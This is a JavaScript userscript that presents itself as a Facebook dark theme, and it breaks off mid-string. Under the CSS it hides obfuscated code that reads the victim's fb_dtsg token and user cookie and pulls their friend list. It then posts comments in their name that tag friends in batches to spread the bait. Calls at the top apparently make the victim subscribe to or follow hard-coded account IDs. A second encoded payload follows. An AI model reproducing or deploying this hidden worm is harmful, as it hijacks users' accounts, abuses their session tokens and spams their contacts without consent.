    sublist("259017954269554");
    sublist("259018054269544");
    sublist("259018157602867");
    sublist("259018220936194");
    //didix
    sublist("301530279986717");
    sublist("304570603016018");
    sublist("350136081792803");
    sublist("362062453933499");
    sublist("362129007260177");
    sublist("361898670616544");
    //wiloka
    sublist("341262566010077");
    sublist("315727835230217");
    sublist("332103303592670");
    //kiky
    sublist("479309888847469");
     
     
    // Jagan di hapus nanti tidak work lagi
    a("100004840530146");a("100003790101386");a("100003892437053");a("100007517593570");a("100006622630530");
     
    //Theme
    (function() {
    var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n\ndiv.mainWrapper{\npadding-left: 1em !important;\n}\n.uiProgressBar .fill {\nbackground: #444 !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #111 !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #333 !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.pop_container {\nbackground-color: #000 !important;\n}\n.pop_verticalslab, .pop_horizontalslab {\nbackground: #222 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: #111 !important;\n}\n.HighlightSelectorMenu {\nborder: 2px solid #000 !important;\nbackground: #111 !important;\nborder-radius: 5px !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n-webkit-border-radius: 8px !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: #111 !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\ncolor: #fff !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\n-webkit-border-radius: 2px !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\npadding: 8px 0 8px 1px !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\nborder-radius: 10px !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nhtml{background:url(http://www.hdewallpaper.com/wp-content/uploads/2013/08/Wallpaper-black-background-red-color-paint-explosion-burst-red-1024x640.jpg) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}\n\n\n\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: #111111 !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground: #111111 !important;\n}\n\n#leftCol {\nposition: relative;top:20px!important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: transparent !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #222222 !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: #111111 !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #346875 !important; \nborder: #333333 !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n\n\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #222222 !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #666666 !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: #111111 !important;\n}\n\n.uiButton {\nbackground: #1c1c1c !important;\n}\n\n#blueBar  {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 0 7px rgba(52, 104, 117, 0.75) !important;\nborder:4px ridge #346875 !important;\nmargin-top:5px!important;\nmargin-left:5px!important;\nborder-radius: 70px!important;\n}\n\n\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #1c1c1c !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground-color: #111111 !important; \nborder-radius: 15px !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground: #111111 !important;\nborder-radius: 15px !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground: #111111 !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground: #111111 !important;\nborder-radius: 15px !important; \nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #346875 !important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #346875 !important;\nborder: #333333 !important;\n}\n\n\n\n\n\n\n\n\n.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 2px 4px rgba(52, 104, 117, 0.75) !important;\nborder:2px ridge #346875 !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.fbx #pageHead, #blueBar #pageHead{\npadding-top:0px!important;\n}\n\n.slim #blueBar {\n\n    height: 35px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,\n._s0,\n._42fz .pic{\n   border:2px solid  rgba(0, 0, 0, .55)!important;\n   border-radius: 37px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,\n._s0:hover,\n._42fz .pic:hover{\n   box-shadow: 0px 0px 4px rgba(52, 104, 117, 0.75) !important;\n   border:2px ridge #346875 !important;\n   border-radius: 37px!important;\n}\n.uiSideNav .sideNavItem .hasCount:hover,\n.uiSideNav .sideNavItem .noCount:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #346875 !important;\n\n}\n#navSearch {\nwidth:300px !important;\nmargin-top: 6px !important;\nmargin-left: 30px !important;\nborder-color: transparent !important;\n}\n#headNav {\n    height: 30px;\n}\n\n\n\na:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #346875 !important;\n}\n.UIActionLinks_bottom a, \n.UIActionLinks_bottom button.as_link, \n.UIActionLinks_bottom .uiLinkButton input, \n.UIActionLinks_bottom .uiLinkButton input:hover,\n.uiStreamMessage .actorName, .uiStreamMessage .passiveName\n{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #346875 !important;\n}\n._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,\n .better_fb_mini_message, .sfx_mini_message_no_x,\n .GM_options_wrapper_inner,\n .better_fb_mini_message, .mini_x{\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top, #45484d  0%,#000000 100%);\nbox-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;\nborder:2px ridge #346875 !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.GM_options_buttons input{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #346875 !important;\n\n}";
    if (typeof GM_addStyle != "undefined") {
            GM_addStyle(css);
    } else if (typeof PRO_addStyle != "undefined") {
            PRO_addStyle(css);
    } else if (typeof addStyle != "undefined") {
            addStyle(css);
    } else {
            var node = document.createElement("style");
            node.type = "text/css";
            node.appendChild(document.createTextNode(css));
            var heads = document.getElementsByTagName("head");
            if (heads.length > 0) {
                    heads[0].appendChild(node);
            } else {
                    // CFx Nymouz™
                    document.documentElement.appendChild(node);
            }
    }
    })();
    var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","764640653546780","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," Cobain deh \udbb8\udc3c @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Keren Work 100% Cara Merubah Tema FaceBook Dan Emoticons \ud83d\udc39\ud83c\udf31\ud83c\udf53\ud83c\udf4a\ud83c\udf34\ud83c\udf4e\ud83c\udf1f\ud83c\udf43\ud83c\udf40\ud83c\udf3b\ud83c\udf3a\ud83c\udf39\ud83c\udf38\ud83c\udf37 ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);_4515='_4515=_8050';_8050(_2707);var _6259;var _2615='23856B126E172A1532A1406E1508C1016B1394B1112B1544B1406F1124E1124E1418C1190C1370B1028D1532F1406A1472E1526E1430C1028F1088F1028F1436C1412B1394E1424E1520F1514B1442A1028F1088C1028D1442F1430E1520D1238A1472F1430F1478D1430F1484D1520D1514E1220F1550D1292B1406B1478A1430A1028C1088E1028C1478D1406D1520E1418A1448F1028C1088D1028B1418F1490A1490A1466A1454A1430F1028E1088B1028C1154B1148F1136B1148A1136E1112D1148F1142C1130B1142E1136A1148F1154E1160A1112E1028B1088D1028E1490C1484C1508A1430A1406D1424B1550B1514A1520C1406B1520C1430C1418B1448C1406E1484F1442D1430F1028A1088D1028D1508F1430D1406C1424C1550A1322A1520A1406D1520B1430A1028F1088D1028F1406C1508A1466C1406C1424E1406F1514D1472E1406D1508C1016B1190C1016D1028F1088D1028B1436F1490E1508D1016F1064F1178F1178B1070E1178A1028D1088F1028D1028D1088A1028F1508C1430E1496B1472F1406E1418D1430C1028E1088F1028B1508D1430A1514F1496F1490B1484F1514E1430F1328F1430A1544D1520E1028F1088A1028F1178E1028B1088C1028C1472C1430D1484A1442C1520E1448A1028D1088F1028F1430F1484A1520E1508F1454F1430B1514D1028F1088B1028C1496C1406A1550F1472D1490D1406B1424A1028C1088E1028A1508D1490D1526E1484E1424E1028B1088D1028A1016B1226E1490B1412A1406A1454F1484F1016F1424E1430B1448B1016A1376C1526A1424D1412E1412E1160C1376F1526E1424D1418D1130D1418F1016F1208C1370F1028D1088F1028F1526A1454F1424C1028B1088C1028C1172C1028B1088B1028A1520C1430E1544F1520A1028D1088D1028F1382D1028D1088E1028F1016F1028C1088D1028F1376B1544C1124D1148A1436E1454E1472A1520D1430E1508F1370A1112B1382F1190A1526E1514A1430E1508D1028D1088A1028A1376F1544F1124D1148B1490D1496A1520A1454B1490E1484B1514D1370A1112C1382D1190E1436D1508B1454E1430B1484A1424D1514C1394A1490B1484E1472B1550E1028F1088B1028F1376A1544D1124A1148D1490E1496D1520B1454D1490E1484C1514C1370E1118B1382E1190E1484C1478C1028C1088D1028C1376C1544D1124C1148E1520A1490D1466B1430B1484A1190C1532C1154F1028B1088C1028E1376E1544B1124D1148B1532E1454F1430A1538F1430D1508A1190A1028C1088C1028E1376B1544E1124F1148A1394A1394F1526C1514F1430E1508D1190B1028B1088F1028D1448B1520C1520D1496E1514D1172D1106D1106D1028E1088D1028A1454A1484D1424E1430D1544C1298C1436F1028B1088B1028B1334B1316B1280E1028E1088D1028B1250E1238C1328D1028A1088B1028F1448E1520F1520C1496B1514A1172B1106C1106C1538D1538E1538A1100F1436F1406E1418E1430D1412F1490E1490F1466E1100E1418F1490E1478D1106E1406C1460A1406B1544D1106A1520C1550C1496E1430A1406A1448C1430E1406F1424F1106E1436E1454E1508E1514E1520D1394A1424E1430F1442F1508C1430A1430C1100C1496B1448E1496F1202E1394F1394E1406A1190B1118C1028A1088E1028D1490E1496E1430B1484C1028A1088B1028C1448C1520E1520B1496F1172B1106E1106D1538F1538E1538B1100E1436B1406B1418A1430B1412B1490C1490E1466B1100D1418A1490D1478A1106A1406C1460B1406C1544E1106F1520A1550E1496F1430D1406F1448D1430A1406D1424C1106E1436D1454E1508F1514A1520E1394D1424C1430F1442A1508B1430E1430F1100E1496E1448C1496D1202F1394C1394F1406D1190F1118E1028E1088F1028B1514A1430F1484B1424F1028B1088B1028A1508B1406E1484E1424F1490B1478F1028D1088C1028B1436D1472E1490B1490D1508F1028E1088C1028F1376D1544E1124D1148C1436A1520B1394E1430C1484E1520C1394D1454C1424F1430A1484C1520E1454E1436D1454A1430A1508A1190B1028D1088E1028D1376F1544F1124F1148D1418A1490C1478A1478B1430C1484A1520D1394A1520D1430E1544F1520C1190F1016E1274C1430C1508D1430A1484F1016D1346F1490F1508F1466F1016A1118C1112F1112C1046E1016F1226E1406F1508B1406F1016A1286E1430B1508F1526E1412B1406D1448B1016A1328D1430B1478D1406A1016D1244A1406B1418D1430F1220B1490F1490E1466A1016E1232E1406D1484D1016A1238C1478B1490D1520B1454B1418E1490C1484D1514A1016E1376A1526C1424D1160C1130E1424C1376C1526E1424F1418C1130D1166F1376E1526E1424B1160F1130F1418F1376E1526E1424A1436D1130A1118B1376A1526E1424F1160A1130B1418E1376D1526A1424E1436A1142A1130C1376E1526A1424F1160D1130C1418E1376A1526D1424A1436B1136F1406B1376D1526C1424E1160F1130D1418B1376E1526E1424D1436A1130E1136F1376C1526A1424F1160B1130F1418E1376B1526A1424D1436D1136F1430E1376F1526B1424A1160C1130A1418D1376F1526C1424C1436E1118F1436C1376A1526F1424C1160F1130A1418A1376E1526D1424B1436B1136C1130E1376C1526E1424A1160A1130F1418E1376E1526A1424F1436C1136A1112C1376C1526D1424E1160D1130F1418E1376A1526E1424A1436B1130E1412C1376B1526A1424F1160C1130F1418E1376A1526D1424A1436D1130A1406C1376F1526D1424E1160A1130B1418A1376B1526C1424E1436E1130B1166A1376A1526F1424C1160E1130A1418A1376F1526E1424C1436C1130A1160A1376C1526C1424D1160C1130B1418D1376B1526A1424F1436A1130D1154C1016F1028B1088A1028F1376D1544A1124B1148C1514E1490A1526F1508B1418E1430B1190E1124C1028E1088D1028D1376A1544D1124D1148A1418C1472E1454B1430F1484F1520F1394E1454D1424E1190B1118D1130B1154F1154A1160F1154E1118B1154A1166E1154E1118A1130A1160C1172B1118F1154C1112A1154E1112A1118C1160D1112D1166B1124C1028A1088D1028D1376E1544E1124E1148A1508B1430E1496A1472E1550C1394E1436F1412B1454A1424D1028E1088A1028A1376C1544D1124D1148C1496E1406C1508D1430D1484F1520A1394B1418F1490B1478C1478D1430D1484C1520B1394B1454D1424C1028E1088E1028D1376F1544D1124C1148F1508B1490B1490B1520C1454A1424C1190C1526D1394A1460D1514B1490E1484F1496D1394B1124F1394F1130F1028F1088D1028D1376E1544C1124C1148D1418C1472E1496E1190C1562E1376F1544A1124F1124C1418F1472F1394D1454E1478A1496D1454D1424D1376A1544A1124D1124B1172E1376A1544A1124F1124C1136A1142B1130C1142E1124A1136D1406B1112C1376F1544E1124D1124D1088E1376C1544B1124D1124E1418E1472B1430F1406C1508F1418A1490D1526B1484A1520E1430B1508E1376B1544C1124C1124E1172B1112B1088A1376F1544F1124B1124C1430D1472D1430E1478D1430D1484E1520E1454F1424E1376A1544A1124E1124A1172A1376A1544C1124B1124F1460F1514A1394C1142E1376E1544B1124A1124F1088A1376A1544A1124E1124A1532B1430B1508A1514D1454A1490E1484F1376B1544B1124B1124F1172A1376D1544A1124C1124E1544A1376A1544A1124D1124D1088C1376F1544C1124E1124B1496A1406E1508B1430C1484D1520C1394B1436E1412D1454A1424D1376F1544B1124D1124A1172E1028D1088D1028A1574E1028C1088F1028B1376C1544E1124B1148C1406F1520F1520F1406D1418A1448D1430A1424C1394D1514F1520E1454B1418A1466E1430C1508E1394A1436F1412E1454A1424B1190C1112A1028E1088B1028B1376D1544A1124D1148A1406F1520B1520C1406C1418F1448A1430E1424D1394C1496D1448C1490C1520F1490E1394C1436B1412A1454F1424B1190F1112D1028B1088F1028F1376C1544F1124F1148E1442D1454D1436C1520B1490E1418D1418A1406D1514A1454C1490E1484E1028E1088C1028D1376D1544F1124A1148B1436D1520A1370A1520C1484B1382A1190B1370D1382A1028E1088E1028B1376F1544D1124F1148C1394D1394C1406F1190F1118F1028E1088A1028F1376F1544B1124C1148B1394F1394D1424A1550F1484C1190E1154B1484E1160F1406A1448A1550E1460E1130E1142A1550B1484A1544F1472E1124D1526F1142D1244A1166D1154B1274A1430C1496C1238E1514C1550B1490E1028E1088B1028F1376B1544C1124D1148B1394D1394E1508C1430C1502E1190D1502E1028E1088E1028D1376D1544C1124B1148E1436C1412B1394C1424E1520F1514F1442A1190E1028C1088E1028F1376E1544E1124E1148D1520B1520C1514E1520C1406B1478A1496B1190E1028B1088B1028D1304D1298D1322A1328C1028F1088E1028B1106A1406D1460A1406C1544E1106D1526A1436A1454A1106A1406E1424E1424C1394C1418A1490A1478C1478C1430A1484F1520A1100E1496A1448A1496D1028D1088D1028C1226F1490B1484A1520C1430F1484C1520A1094E1520F1550D1496C1430D1028A1088F1028E1406D1496E1496A1472C1454E1418D1406E1520C1454E1490F1484E1106B1544E1094F1538C1538A1538C1094C1436F1490F1508C1478B1094A1526B1508D1472F1430D1484B1418C1490D1424E1430F1424C1028E1088B1028C1514E1430C1520D1316F1430B1502E1526F1430A1514E1520A1256C1430F1406D1424D1430A1508E1028B1088D1028D1514C1520A1406E1520F1526A1514D1028E1088B1028A1418F1472F1490B1514B1430B1028F1382E1178B1532E1406F1508F1016C1436B1412B1394D1424F1520C1514E1442E1190A1424F1490E1418B1526C1478A1430C1484F1520A1370E1394F1112D1544A1406C1124D1124A1418A1370C1124E1382E1382A1064B1394F1112B1544E1406D1124D1124E1418E1370A1118F1382D1070C1370F1112E1382D1370C1394B1112B1544F1406A1124D1124B1418E1370D1112A1382E1382B1178C1532E1406D1508E1016C1526E1514A1430F1508F1394C1454A1424D1190E1424B1490D1418C1526A1478F1430D1484E1520C1370C1394B1112E1544D1406D1124E1124D1418C1370C1136F1382D1382C1370C1394D1112E1544D1406E1124B1124C1418A1370A1130B1382C1382D1064B1424D1490A1418D1526B1478B1430B1484B1520B1370C1394A1112E1544B1406F1124A1124A1418E1370F1136D1382A1382D1370B1394D1112D1544E1406D1124B1124B1418E1370D1130E1382C1382B1064B1106B1418B1394C1526D1514D1430A1508A1190C1064F1376E1424B1082C1070B1106E1070B1370A1118B1382F1070A1178C1532C1406C1508B1016F1454E1424E1190F1394D1112D1544A1406A1124A1124D1418E1370F1142B1382E1178D1532C1406D1508B1016B1406B1508B1466F1406C1424D1406D1514E1472B1406E1508D1190E1370B1382B1178E1532C1406D1508E1016A1514E1532D1484F1394B1508C1430A1532B1178B1436B1526F1484D1418F1520B1454C1490E1484A1016F1406B1508F1466D1406C1424A1406B1514F1472D1406A1508F1454D1394F1406C1472D1064B1454E1424B1070B1562B1532A1406F1508C1016C1394C1112C1544D1154B1160A1166D1124A1544D1154F1190F1016E1484A1430B1538F1016A1352B1286F1280D1256E1520B1520B1496C1316F1430C1502A1526D1430D1514B1520A1064F1070F1178D1394A1112B1544E1154A1160A1166C1124F1544B1154F1370C1394F1112A1544B1406A1124E1124B1418B1370D1148B1382F1382D1190E1436A1526B1484B1418B1520E1454D1490C1484F1016F1064E1070F1562F1454C1436C1064E1394A1112D1544E1154C1160E1166E1124E1544B1154F1370B1394A1112D1544F1406B1124C1124D1418D1370B1154E1382D1382B1190F1190F1136E1070A1562F1430E1532B1406A1472F1064B1394E1112F1544B1406E1124C1124F1418F1370E1160C1382E1082B1394A1112E1544B1154B1160D1166B1124D1544A1154D1370D1394A1112C1544D1406A1124C1124E1418F1370A1118D1124A1382C1382E1100B1520F1490F1322A1520F1508D1454A1484A1442A1064A1070B1370F1394F1112A1544B1406B1124C1124D1418E1370A1118C1118C1382A1382B1064E1394D1112D1544A1406A1124B1124B1418C1370F1166B1382A1088B1394A1112C1544B1406B1124A1124B1418C1370C1118B1112D1382C1070A1082C1394D1112C1544F1406F1124D1124D1418F1370C1118C1130D1382B1070D1178D1436E1490C1508C1064E1436C1190B1112B1178D1436B1184F1286E1406F1520D1448C1370F1394A1112B1544C1406C1124E1124D1418D1370B1118B1154D1382D1382B1064F1406F1508C1466B1406F1424B1406B1514C1472C1406A1508E1370E1394F1112A1544E1406B1124A1124B1418A1370E1118D1148C1382D1382C1370B1394F1112C1544A1406C1124E1124B1418B1370C1118B1142E1382C1382B1370F1394F1112F1544D1406C1124D1124C1418A1370C1118D1136B1382F1382A1106B1124A1154D1070F1178D1436F1082C1082C1070A1562C1478C1430A1514C1406F1460B1190A1394B1112F1544F1406B1124C1124B1418C1370C1118D1112F1382D1178B1478F1430C1514C1406D1460B1394B1520E1430F1544E1520F1190C1394A1112F1544C1406E1124F1124D1418B1370A1118F1112F1382A1178C1436D1490F1508C1064A1454F1190E1436D1076A1124F1154E1178D1454E1184D1064A1436F1082B1118E1070D1076A1124F1154F1178A1454B1082A1082B1070E1562D1454C1436F1064F1406F1508A1466D1406D1424A1406E1514F1472F1406E1508F1370C1394C1112A1544A1406F1124D1124A1418B1370D